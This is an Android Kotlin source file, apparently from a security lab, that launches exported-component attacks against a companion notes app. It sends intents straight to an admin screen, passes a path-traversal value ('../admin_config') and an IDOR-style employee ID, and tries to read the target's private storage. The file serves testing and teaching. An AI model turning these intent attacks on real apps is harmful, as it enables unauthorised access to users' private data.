package com.lab.attacklab

import android.content.Intent
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var txt: TextView
    private val cible = "com.lab.securenotes"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        txt = findViewById(R.id.txtResult)

        // Test 0 : acces direct au stockage prive (doit echouer : sandbox)
        findViewById<Button>(R.id.btnTest0).setOnClickListener {
            val msg = try {
                val liste = java.io.File("/data/data/$cible/shared_prefs/").listFiles()
                if (liste == null) "Test 0 : ACCES REFUSE (listFiles = null, sandbox OK)"
                else "Test 0 : ACCES REUSSI : " + liste.joinToString { it.name }
            } catch (e: Exception) {
                "Test 0 : ACCES REFUSE : ${e.message}"
            }
            txt.text = msg
        }

        findViewById<Button>(R.id.btnTest1).setOnClickListener {
            lancer("Attaque 1", "com.lab.securenotes.AdminActivity", null)
        }

        findViewById<Button>(R.id.btnTest2).setOnClickListener {
            lancer("Attaque 2", "com.lab.securenotes.NoteDetailActivity",
                "noteId" to "../admin_config")
        }

        findViewById<Button>(R.id.btnTest6).setOnClickListener {
            lancer("Attaque 6", "com.lab.securenotes.DossierActivity",
                "employeId" to "bob")
        }
    }

    private fun lancer(nom: String, classe: String, extra: Pair<String, String>?) {
        try {
            val intent = Intent()
            intent.setClassName(cible, classe)
            if (extra != null) intent.putExtra(extra.first, extra.second)
            startActivity(intent)
            txt.text = "$nom : intent envoye (voir l'ecran ouvert)"
        } catch (e: Exception) {
            // Resultat attendu apres correction : composant non exporte
            txt.text = "$nom : BLOQUE -> ${e.javaClass.simpleName}: ${e.message}"
        }
    }
}
